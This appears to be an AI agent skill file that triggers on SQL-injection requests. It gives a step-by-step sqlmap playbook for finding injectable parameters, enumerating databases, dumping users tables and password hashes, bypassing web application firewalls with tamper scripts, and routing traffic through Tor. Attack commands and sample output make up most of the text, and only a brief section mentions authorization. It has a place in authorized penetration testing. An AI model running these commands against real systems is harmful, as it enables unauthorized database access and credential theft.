---
name: sqli-poc
description: Detect and exploit SQL injection vulnerabilities using automated and manual techniques. Use when testing for SQL injection, when parameters appear injectable, when database enumeration is needed, or when proving SQL injection impact.
tags:
  - security
  - sql-injection
  - sqli
  - database
  - exploit
triggers:
  - sql injection
  - sqli
  - database injection
  - blind sqli
  - sqlmap
---

# sqli-poc

## When to Use

- Parameter appears to manipulate database queries
- Application displays database errors in responses
- Need to prove SQL injection vulnerability exists
- Extracting data from backend database
- Testing authentication bypass via SQL injection
- WAF bypass techniques required for exploitation
- Second-order SQL injection scenarios detected

## Quick Start

Basic SQL injection scan with sqlmap:

```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
```

## Tools Overview

| Tool   | Type      | Best For                                              |
| ------ | --------- | ----------------------------------------------------- |
| sqlmap | Automated | Detection, enumeration, exploitation, WAF bypass      |
| Manual | Payloads  | Initial confirmation, edge cases, custom exploitation |

## Step-by-Step Process

### Phase 1: Detection

1. **Identify potential injection points**

   ```bash
   sqlmap -u "http://target.com/page.php?id=1" --batch --level=1
   ```

2. **Test with higher sensitivity**

   ```bash
   sqlmap -u "http://target.com/page.php?id=1" --level=3 --risk=2
   ```

3. **Confirm vulnerability type**
   ```bash
   sqlmap -u "http://target.com/page.php?id=1" -v 3
   ```

### Phase 2: Enumeration

1. **Identify DBMS and version**

   ```bash
   sqlmap -u "http://target.com/page.php?id=1" --fingerprint --banner
   ```

2. **List databases**

   ```bash
   sqlmap -u "http://target.com/page.php?id=1" --dbs
   ```

3. **List tables and columns**
   ```bash
   sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
   sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns
   ```

### Phase 3: Data Extraction

1. **Dump specific table**

   ```bash
   sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
   ```

2. **Dump limited rows**
   ```bash
   sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump --start=1 --stop=10
   ```

## Examples

### Example 1: Basic GET Parameter Injection

**Scenario:** Test GET parameter for SQL injection

**Command:**

```bash
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

**Output:**

```
[INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable
back-end DBMS: MySQL >= 5.0
banner: '5.7.33-0ubuntu0.18.04.1'
```

### Example 2: POST Data Injection

**Scenario:** Test login form for SQL injection

**Command:**

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --batch
```

**Output:**

```
[INFO] POST parameter 'username' is vulnerable
```

### Example 3: Cookie-Based Injection

**Scenario:** Test session cookie for injection

**Command:**

```bash
sqlmap -u "http://target.com/dashboard.php" --cookie="session=abc123" --level=2 --batch
```

**Output:**

```
[INFO] Cookie parameter 'session' is injectable
```

### Example 4: Header Injection

**Scenario:** Test HTTP headers for injection

**Command:**

```bash
sqlmap -u "http://target.com/api.php" --headers="X-Forwarded-For: 1*" --level=3 --batch
```

**Output:**

```
[INFO] header 'X-Forwarded-For' is injectable
```

### Example 5: Time-Based Blind Injection

**Scenario:** No visible error output, test time-based

**Command:**

```bash
sqlmap -u "http://target.com/search.php?q=test" --technique=T --time-sec=5 --batch
```

**Output:**

```
[INFO] GET parameter 'q' is 'MySQL >= 5.0.12 AND time-based blind' injectable
```

### Example 6: UNION-Based Injection

**Scenario:** Force UNION query technique

**Command:**

```bash
sqlmap -u "http://target.com/view.php?id=1" --technique=U --union-cols=5 --batch
```

**Output:**

```
[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 5 columns' injectable
```

### Example 7: WAF Bypass with Tamper Scripts

**Scenario:** Target behind WAF blocking requests

**Command:**

```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between,randomcase --batch
```

**Output:**

```
[INFO] loading tamper script 'space2comment'
[INFO] loading tamper script 'between'
[INFO] loading tamper script 'randomcase'
[INFO] GET parameter 'id' is injectable
```

### Example 8: Database Enumeration

**Scenario:** List all databases on server

**Command:**

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
```

**Output:**

```
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] webapp_db
```

### Example 9: Table Enumeration

**Scenario:** List tables in specific database

**Command:**

```bash
sqlmap -u "http://target.com/page.php?id=1" -D webapp_db --tables --batch
```

**Output:**

```
Database: webapp_db
[5 tables]
+---------------+
| users         |
| orders        |
| products      |
| sessions      |
| logs          |
+---------------+
```

### Example 10: Column Enumeration

**Scenario:** List columns in users table

**Command:**

```bash
sqlmap -u "http://target.com/page.php?id=1" -D webapp_db -T users --columns --batch
```

**Output:**

```
Database: webapp_db
Table: users
[5 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| username | varchar(50) |
| password | varchar(64) |
| email    | varchar(100)|
| role     | varchar(20) |
+----------+-------------+
```

### Example 11: Data Extraction

**Scenario:** Dump user credentials (for authorized testing)

**Command:**

```bash
sqlmap -u "http://target.com/page.php?id=1" -D webapp_db -T users -C username,password --dump --batch
```

**Output:**

```
Database: webapp_db
Table: users
[3 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| user1    | e99a18c428cb38d5f260853678922e03 |
| user2    | d8578edf8458ce06fbc5bb76a58c5ca4 |
+----------+----------------------------------+
```

### Example 12: Request File Injection

**Scenario:** Test request captured from Burp Suite

**Command:**

```bash
sqlmap -r request.txt --batch --dbs
```

**request.txt:**

```
POST /api/search HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=abc123

{"query":"test","limit":10}
```

### Example 13: Second-Order SQL Injection

**Scenario:** Injection stored and triggered elsewhere

**Command:**

```bash
sqlmap -u "http://target.com/register.php" --data="username=test&email=a@b.com" --second-url="http://target.com/profile.php" --batch
```

**Output:**

```
[INFO] testing for second-order SQL injection
[INFO] second-order SQL injection found
```

### Example 14: Smart Scan with Multiple Parameters

**Scenario:** Efficiently test page with many parameters

**Command:**

```bash
sqlmap -u "http://target.com/search.php?cat=1&sort=name&page=1&limit=10" --smart --batch
```

**Output:**

```
[INFO] skipping GET parameter 'sort' (appears non-dynamic)
[INFO] skipping GET parameter 'page' (appears non-dynamic)
[INFO] GET parameter 'cat' is injectable
```

## Injection Techniques Reference

| Technique           | Code | Description                           | Detection Method               |
| ------------------- | ---- | ------------------------------------- | ------------------------------ |
| Boolean-based blind | B    | Infers data from True/False responses | Response content differs       |
| Error-based         | E    | Extracts data via database errors     | Error messages in response     |
| UNION query         | U    | Combines results with original query  | Data appears in response       |
| Stacked queries     | S    | Executes multiple statements          | Requires specific DBMS support |
| Time-based blind    | T    | Infers data from response delays      | Response time varies           |
| Inline queries      | Q    | Nested subqueries in WHERE clause     | Data in response               |

## Tamper Scripts Reference

| Script                 | Description                | Use Case                  |
| ---------------------- | -------------------------- | ------------------------- |
| `space2comment`        | Replace spaces with /\*\*/ | Basic WAF bypass          |
| `between`              | Replace > with BETWEEN     | Operator filtering bypass |
| `randomcase`           | Random upper/lowercase     | Case-sensitive WAF bypass |
| `charencode`           | URL encode characters      | Encoding bypass           |
| `base64encode`         | Base64 encode payload      | Encoding-based bypass     |
| `equaltolike`          | Replace = with LIKE        | Operator filtering        |
| `space2hash`           | Replace spaces with #      | MySQL specific            |
| `space2plus`           | Replace spaces with +      | URL encoding bypass       |
| `modsecurityversioned` | Add versioned comment      | ModSecurity bypass        |
| `apostrophenullencode` | UTF-8 null encode quotes   | Quote filtering bypass    |

## Level and Risk Reference

| Level | Tests Added                     |
| ----- | ------------------------------- |
| 1     | Default - GET/POST parameters   |
| 2     | Cookie header values            |
| 3     | User-Agent, Referer headers     |
| 4     | Additional payloads             |
| 5     | Maximum payloads and boundaries |

| Risk | Payload Types                             |
| ---- | ----------------------------------------- |
| 1    | Innocuous payloads                        |
| 2    | Heavy time-based queries                  |
| 3    | OR-based payloads (potentially dangerous) |

## sqlmap Flag Reference

| Flag              | Description                   |
| ----------------- | ----------------------------- |
| `-u`              | Target URL with parameters    |
| `-r`              | Load request from file        |
| `--data`          | POST data string              |
| `--cookie`        | HTTP Cookie header            |
| `--level`         | Test level (1-5)              |
| `--risk`          | Risk level (1-3)              |
| `--technique`     | Injection techniques (BEUSTQ) |
| `--tamper`        | Tamper script(s)              |
| `--dbs`           | Enumerate databases           |
| `--tables`        | Enumerate tables              |
| `--columns`       | Enumerate columns             |
| `--dump`          | Dump table contents           |
| `-D`              | Specify database              |
| `-T`              | Specify table                 |
| `-C`              | Specify column(s)             |
| `--batch`         | Non-interactive mode          |
| `--smart`         | Skip non-dynamic params       |
| `--threads`       | Concurrent requests           |
| `--proxy`         | Use proxy                     |
| `--tor`           | Use Tor network               |
| `--random-agent`  | Random User-Agent             |
| `--flush-session` | Clear session data            |
| `-v`              | Verbosity (0-6)               |
| `--fingerprint`   | DBMS fingerprinting           |
| `--banner`        | DBMS banner                   |
| `--current-user`  | Current DB user               |
| `--current-db`    | Current database              |
| `--passwords`     | Dump password hashes          |
| `--privileges`    | User privileges               |
| `--roles`         | User roles                    |

## Output Parsing

### Parse sqlmap Session Files

```bash
# Session files stored in ~/.sqlmap/output/
ls ~/.sqlmap/output/target.com/

# View injection details
cat ~/.sqlmap/output/target.com/log

# View dumped data
cat ~/.sqlmap/output/target.com/dump/database/table.csv
```

### Extract Data Programmatically

```bash
# Run with output directory
sqlmap -u "http://target.com/?id=1" --output-dir=/tmp/sqli_results --batch

# CSV dump for processing
sqlmap -u "http://target.com/?id=1" -D db -T users --dump --dump-format=CSV
```

## Error Handling

| Error                                               | Cause                            | Resolution                         |
| --------------------------------------------------- | -------------------------------- | ---------------------------------- |
| `connection timed out`                              | Network issues or slow target    | Use `--timeout=60`                 |
| `target URL not stable`                             | Dynamic content changing         | Use `--string="unique_text"`       |
| `no parameter(s) found`                             | No injectable params in URL      | Add `--data` or check URL format   |
| `all tested parameters appear to be not injectable` | No vulnerability or wrong params | Increase `--level` and `--risk`    |
| `WAF/IPS detected`                                  | Security filter blocking         | Use `--tamper` scripts             |
| `unable to connect`                                 | Target unreachable               | Check URL, use `--proxy` if needed |
| `CRITICAL: no parameter(s) to test`                 | Missing parameters               | Verify URL has `?param=value`      |
| `connection reset by peer`                          | Rate limiting or blocking        | Use `--delay=1` between requests   |
| `heuristic test shows might not be injectable`      | Weak or no SQLi indicators       | Try `--level=5 --risk=3`           |
| `sqlmap requires python`                            | Python not installed             | Install Python 3.x                 |

## Responsible Testing Notes

- **Authorization Required**: Only test systems you have explicit permission to test
- **Scope Limitations**: Respect program scope and rules of engagement
- **Data Sensitivity**: Avoid dumping more data than needed for proof
- **Minimize Impact**: Use `--delay` to reduce server load
- **Documentation**: Screenshot evidence, save session logs
- **Report Format**: Include injection point, technique, impact, and remediation

## References

- [sqlmap Official Site](https://sqlmap.org/)
- [sqlmap GitHub](https://github.com/sqlmapproject/sqlmap)
- [sqlmap User Manual](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [sqlmap Tamper Scripts](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
